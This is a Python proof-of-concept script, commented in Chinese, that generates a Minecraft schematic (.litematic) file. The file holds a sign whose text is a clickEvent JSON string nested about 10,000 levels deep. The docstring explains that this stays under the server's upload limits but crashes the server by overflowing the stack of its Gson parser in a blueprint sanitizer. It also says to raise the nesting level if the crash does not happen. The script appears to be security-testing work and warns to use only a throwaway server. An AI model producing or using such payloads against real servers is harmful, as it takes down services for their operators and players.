# -*- coding: utf-8 -*-
"""
第 14 项延伸：服务端解析 DoS 复现文件。

危险点：BlueprintSanitizer.hasSignCommandClickEvent 对告示牌 messages / 讲台
Book.pages，只要字符串包含 "clickEvent" 子串就用 Gson 完整解析（无深度上限，
Gson 建树是递归下降）。一串「含 clickEvent + 10 万层嵌套」的 JSON：
  * 上传字节 / 解压 32MB / 单体 8KB / 总量 32MB 全都在限内（几百 KB，不拒收）
  * 净化（清 NBT）发生在玩家决定之后，扫描阶段的解析先崩
=> 服务端 Gson 栈溢出，主线程 StackOverflowError -> 服务器崩/停。

生成：单块告示牌，第一行 messages = 上述 JSON。未压缩 ~数百 KB，gzip 后很小。

⚠ 只许在「可丢弃的测试服务器」上验证，别对正式服/存档环境上传；
   若它没崩，把 LEVELS 调大重生成。
"""
import ast, io, os

GEN2 = r"C:\Users\Yim\AppData\Local\Temp\opencode\gen2.py"
OUT  = r"D:\XioYimData\下载\新建文件夹"
LEVELS = 10_000    # NBT 单字符串 65535 字节硬上限 → 一层 ~6B，最多 ~1 万层

src  = io.open(GEN2, encoding='utf-8').read()
tree = ast.parse(src)
keep = [n for n in tree.body
        if isinstance(n, (ast.FunctionDef, ast.Import, ast.ImportFrom))]
ns = {}
exec(compile(ast.Module(body=keep, type_ignores=[]), 'gen2-funcs', 'exec'), ns)
gen_litematic = ns['gen_litematic']

AIR  = "minecraft:air"
SIGN = "minecraft:oak_sign"

def idx_of(x, y, z, W, L):
    return y * (L * W) + z * W + x

def flat(W, H, L, filled):
    out = [0] * (W * H * L)
    for (x, y, z), pi in filled.items():
        out[idx_of(x, y, z, W, L)] = pi
    return out

def dos_sign_te(x, y, z):
    # 扁平字符串拼接，绝不能用嵌套 python 对象（100k 层自身会炸 python 栈）。
    deep = '"leaf"'
    for _ in range(LEVELS):
        deep = '{"a":' + deep + '}'
    msg = '{"clickEvent":{"action":"run_command","value":"ping"},"deep":' + deep + '}'
    empty = '""'
    return {
        "id": (8, "minecraft:sign"),
        "x": (3, x), "y": (3, y), "z": (3, z),
        "is_waxed": (1, 0),
        "front_text": (10, {
            "has_glowing_text": (1, 0),
            "color": (8, "black"),
            "messages": (9, (8, [msg, empty, empty, empty])),
        }),
    }

W, H, L = 3, 1, 3
p = os.path.join(OUT, "44_hover_dos_clickEvent1万层.litematic")
gen_litematic(p, W, H, L, [AIR, SIGN],
              flat(W, H, L, {(1, 0, 1): 1}),
              tile_entities=[dos_sign_te(1, 0, 1)])
print("LEVELS =", LEVELS)
print("写出:", p)
print("文件字节:", os.path.getsize(p))
